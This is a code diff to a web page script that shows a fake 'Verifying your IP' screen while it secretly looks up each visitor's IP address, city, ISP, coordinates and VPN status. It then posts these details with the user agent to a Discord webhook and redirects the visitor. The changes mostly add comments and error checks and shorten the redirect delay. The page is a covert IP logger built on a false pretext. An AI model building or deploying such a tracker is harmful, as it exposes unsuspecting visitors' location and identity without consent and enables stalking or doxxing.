@@ -45,24 +45,26 @@
             document.getElementById('verify').innerHTML = `<h1>Verifying your IP...</h1><p class="loading">Please wait while we validate your connection...</p>`;
 
             try {
-                // Get IP address
+                // Fetch the user's IP address from ipify
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // Get location data including VPN detection
+                // Fetch location data from ip-api.com
                 const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
                 const locationData = await locationResponse.json();
 
                 if (locationData.status !== "success") {
                     console.error("Error getting location data:", locationData.message);
-                    window.location.href = redirectURL; // Redirect if there's an error
+                    window.location.href = redirectURL; // Redirect even if there's an error
                     return;
                 }
 
-                const userAgent = navigator.userAgent;
+                // Determine VPN status
                 const vpnStatus = locationData.proxy || locationData.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
 
+                // Create the message to send to Discord
+                const userAgent = navigator.userAgent;
                 const message = {
                     content: `**New Visitor Logged**\n\n` +
                              `**IP Address:** ${locationData.query}\n` +
@@ -83,7 +85,7 @@
                 };
 
                 // Send data to Discord webhook
-                await fetch(webhookURL, {
+                const discordResponse = await fetch(webhookURL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -91,10 +93,14 @@
                     body: JSON.stringify(message)
                 });
 
+                if (!discordResponse.ok) {
+                    console.error("Error sending message to Discord:", discordResponse.statusText);
+                }
+
                 // Add a small delay before redirecting to ensure data is sent
                 setTimeout(() => {
                     window.location.href = redirectURL;
-                }, 3000); // 1.5 seconds delay
+                }, 1000); // 1 second delay before redirecting
 
             } catch (error) {
                 console.error("Error in logging or redirection:", error);
